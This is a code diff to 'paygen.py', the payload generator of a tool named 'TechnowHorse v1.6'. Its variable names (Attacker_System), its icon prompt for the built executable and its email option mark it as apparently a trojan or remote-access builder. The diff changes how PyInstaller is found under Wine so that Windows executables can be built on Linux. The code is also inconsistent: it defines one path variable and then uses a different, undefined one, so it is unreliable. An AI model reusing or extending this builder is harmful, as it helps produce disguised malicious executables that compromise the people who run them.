@@ -15,7 +15,7 @@ if platform.system() == 'Windows':
     Attacker_System = 'Windows'
 elif platform.system() == 'Linux':
     Attacker_System = 'Linux'
-    PYTHON_PYINSTALLER_PATH = os.path.expanduser("~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
+    PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"
 
 def get_options():
     parser = argparse.ArgumentParser(description=f'{RED}TechnowHorse v1.6')
@@ -37,23 +37,22 @@ def get_options():
     return parser.parse_args()
 
 def get_python_pyinstaller_path():
-    if platform.system() == 'Windows':
-        python_path = subprocess.check_output("where python", shell=True)
+    try:
+        if os.name in ('ce', 'nt', 'dos'): 
+            # If OS == Windows
+            python_path = subprocess.check_output("where pyinstaller.exe", shell=True)
+
+        elif 'posix' in os.name:
+            # If OS == Linux
+            python_path = subprocess.check_output("which pyinstaller.exe", shell=True)
+
         python_path = str(python_path).split('\'')[1]
         python_path = python_path.replace("\\n", "")
         python_path = python_path.replace("\\r", "")
-        python_path = python_path.replace("\\\\", "/")
-        python_path = python_path.replace("python.exe", "Scripts/pyinstaller.exe")
-    elif platform.system() == 'Linux':
-        python_path = subprocess.check_output("locate -i *Scripts/pyinstaller.exe*", shell=True)
-        if python_path != "" and python_path != None:
-            python_path = str(python_path).split('\'')[1]
-            python_path = python_path.replace("\\n", "")
-            python_path = python_path.replace("\\r", "")  
-        else:
-            print(f"{RED}\n[!] Unable to Find Python Pyinstaller Path, Please Update it inside paygen.py at Line 18")
-            exit()
-            
+        python_path = python_path.replace("\\\\", "/")  
+    except Exception:
+        python_path = "UnableToFind"
+
     return python_path
 
 def check_dependencies():
@@ -209,9 +208,14 @@ if __name__ == '__main__':
             arguments.icon = input(f'{RED}[!] Please Specify Icon Path {WHITE}[{GREEN}LEAVE BLANK to SET icon/exe.ico as icon{WHITE}] : ')
             if arguments.icon == "":
                 arguments.icon = "icon/exe.ico"     
-                
-        if not os.path.exists(PYTHON_PYINSTALLER_PATH) and arguments.windows:
-            PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path()            
+            
+        if not os.path.exists(WINDOWS_PYTHON_PYINSTALLER_PATH.replace("wine ", "")) and arguments.windows:
+            WINDOWS_PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path()
+            if WINDOWS_PYTHON_PYINSTALLER_PATH == "UnableToFind":
+                print(f'{RED}[!] Default Pyinstaller Path inside Wine Directory is Incorrect')
+                print(f'{RED}[!] {WHITE}[Please Update Line 19 Later] [{RED}DefautPath: {WHITE}~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe]')
+                WINDOWS_PYTHON_PYINSTALLER_PATH = "wine "
+                WINDOWS_PYTHON_PYINSTALLER_PATH += input(f'\n{WHITE}[?] Enter pyinstaller.exe path manually : ')            
         
         print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{GREEN}')
         print(f'\n   {YELLOW}Email:{RED} ' + arguments.email)
